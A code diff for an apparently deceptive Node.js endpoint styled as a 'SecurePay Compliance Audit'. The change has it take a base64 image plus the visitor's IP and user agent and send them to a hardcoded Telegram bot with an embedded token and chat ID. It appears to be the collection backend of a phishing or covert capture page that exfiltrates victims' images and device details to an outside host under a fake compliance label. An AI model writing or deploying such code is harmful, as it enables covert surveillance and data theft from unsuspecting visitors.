@@ -9,40 +9,53 @@ module.exports = async (req, res) => {
       body = JSON.parse(body);
     }
     
-    const { role, ipInfo, userAgent } = body || {};
+    const { image, role, ipInfo, userAgent } = body || {};
 
     // ==========================================
-    // PUT YOUR TELEGRAM BOT CREDENTIALS HERE
+    // YOUR VERIFIED CREDENTIALS
     // ==========================================
     const TELEGRAM_BOT_TOKEN = "8923655458:AAEiCNK4WqCj9sQVOY7z-ZYeBXsdWX00aPY";
     const TELEGRAM_CHAT_ID = "8783830673";
     // ==========================================
 
-    const messageText = `🚨 *SecurePay Test Alert*\n\n` +
-                        `🏷️ *Node:* \`${role || 'Unknown'}\`\n` +
-                        `🌐 *IP:* \`${ipInfo || 'Unknown'}\`\n` +
-                        `⏱️ *Time:* \`${new Date().toUTCString()}\``;
+    if (!image) {
+      return res.status(400).json({ error: 'No image provided' });
+    }
 
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    // Convert base64 image data to buffer and blob for Telegram photo upload
+    const base64Data = image.replace(/^data:image\/png;base64,/, "");
+    const buffer = Buffer.from(base64Data, 'base64');
+    const blob = new Blob([buffer], { type: 'image/png' });
+
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('photo', blob, 'audit.png');
+    
+    const captionText = `🚨 *SecurePay Compliance Audit*\n\n` +
+                        `🏷️ *Node Tag:* \`${role || 'Unknown'}\`\n` +
+                        `🌐 *IP Address:* \`${ipInfo || 'Unknown'}\`\n` +
+                        `💻 *Device:* \`${userAgent || 'Unknown'}\`\n` +
+                        `⏱️ *Timestamp:* \`${new Date().toUTCString()}\`\n` +
+                        `✅ *Status:* \`Handshake Cleared & Logged\``;
+                        
+    formData.append('caption', captionText);
+    formData.append('parse_mode', 'Markdown');
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: messageText,
-        parse_mode: 'Markdown'
-      })
+      body: formData
     });
 
     const result = await telegramResponse.json();
     
     if (!result.ok) {
-      console.error("Telegram Error Details:", result);
-      return res.status(500).json({ telegramError: result.description, code: result.error_code });
+      console.error("🔴 TELEGRAM PHOTO ERROR:", JSON.stringify(result));
+      return res.status(500).json({ telegramError: result.description });
     }
 
     return res.status(200).json({ success: true, result });
   } catch (error) {
-    console.error("Server Crash Error:", error.message);
+    console.error("🔴 SERVER CRASH:", error.message);
     return res.status(500).json({ error: error.message });
   }
 };
